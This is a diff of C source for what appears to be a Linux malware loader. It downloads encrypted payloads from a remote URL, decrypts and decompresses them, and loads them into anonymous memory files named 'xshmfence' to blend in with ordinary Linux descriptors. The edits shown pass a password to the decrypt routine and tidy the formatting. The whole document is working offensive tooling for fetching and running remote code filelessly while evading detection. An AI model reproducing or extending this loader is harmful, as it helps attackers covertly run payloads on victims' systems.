@@ -23,7 +23,7 @@ int main(int argc, char **argv)
     char *payload_envp[] = PAYLOAD_ENVP; // envp for payload
     char *pathToWrite = PATH_TO_WRITE;
     pid_t child;
-    char *psswd;
+    unsigned char *psswd;
 
     payload = beacon(PAYLOAD_URL);
     payloadOffset = payload.memory; // hold for iteration
@@ -47,7 +47,8 @@ int main(int argc, char **argv)
 
     // password padding
     psswd = psswdPadding(psswd);
-    if(psswd == NULL){
+    if (psswd == NULL)
+    {
         free(payload.memory);
         free(metaBytes);
         return -1;
@@ -56,7 +57,7 @@ int main(int argc, char **argv)
     for (int i = 0; i < numPayloads; i++)
     { // main loop to deploy payloads
 
-        decrypted = (void *)decrypt((unsigned char *)payloadOffset, metaBytes[i].encryptedLength, metaBytes[i].decryptedLength);
+        decrypted = (void *)decrypt((unsigned char *)payloadOffset, metaBytes[i].encryptedLength, metaBytes[i].decryptedLength, psswd);
         if (decrypted == NULL)
         {
             free(decrypted);
@@ -68,7 +69,7 @@ int main(int argc, char **argv)
         decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)metaBytes[i].uncompressedLength, (uLong)metaBytes[i].decryptedLength);
 
         while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
-        { // create memory file descriptor for execution
+        {                                                       // create memory file descriptor for execution
             close(payloadFD);
             free(decompressed);
             free(payload.memory);
